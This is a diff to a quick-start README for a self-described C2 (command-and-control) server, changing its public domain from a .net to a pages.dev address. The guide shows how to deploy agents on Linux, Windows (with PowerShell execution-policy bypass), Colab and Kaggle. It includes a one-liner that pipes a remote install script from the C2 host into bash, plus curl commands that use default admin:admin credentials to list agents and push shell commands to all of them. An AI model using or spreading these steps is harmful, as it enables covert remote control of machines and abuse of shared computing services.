@@ -1,6 +1,6 @@
 # Quick Start Guide
 
-**🌐 Public URL:** https://gbctwoserver.net
+**🌐 Public URL:** https://gbctwoserver.pages.dev
 
 ---
 
@@ -20,7 +20,7 @@ This automatically:
 
 ## 📱 Access Dashboard
 
-**URL:** https://gbctwoserver.net
+**URL:** https://gbctwoserver.pages.dev
 
 **Login:**
 - Username: `admin`
@@ -32,19 +32,19 @@ This automatically:
 
 ### Linux/macOS/Colab/Kaggle
 ```bash
-C2_URL=https://gbctwoserver.net \
+C2_URL=https://gbctwoserver.pages.dev \
 python -m src.agents.universal
 ```
 
 ### Windows (PowerShell)
 ```powershell
-$env:C2_URL="https://gbctwoserver.net"
+$env:C2_URL="https://gbctwoserver.pages.dev"
 powershell -ExecutionPolicy Bypass -File src\agents\windows.ps1
 ```
 
 ### One-Liner (Linux)
 ```bash
-curl -sSL https://gbctwoserver.net/api/agent/install | bash
+curl -sSL https://gbctwoserver.pages.dev/api/agent/install | bash
 ```
 
 ---
@@ -53,17 +53,17 @@ curl -sSL https://gbctwoserver.net/api/agent/install | bash
 
 ### Health Check
 ```bash
-curl https://gbctwoserver.net/api/health
+curl https://gbctwoserver.pages.dev/api/health
 ```
 
 ### List Agents
 ```bash
-curl -u admin:admin https://gbctwoserver.net/api/agents
+curl -u admin:admin https://gbctwoserver.pages.dev/api/agents
 ```
 
 ### Send Command
 ```bash
-curl -X POST https://gbctwoserver.net/api/task/create \
+curl -X POST https://gbctwoserver.pages.dev/api/task/create \
   -H "Content-Type: application/json" \
   -d '{"agent_id":"all","command":"whoami"}'
 ```
@@ -115,7 +115,7 @@ sudo mv /tmp/cloudflared /usr/local/bin/
 ### Agent not connecting
 ```bash
 # Test connectivity
-curl https://gbctwoserver.net/api/health
+curl https://gbctwoserver.pages.dev/api/health
 ```
 
 ---
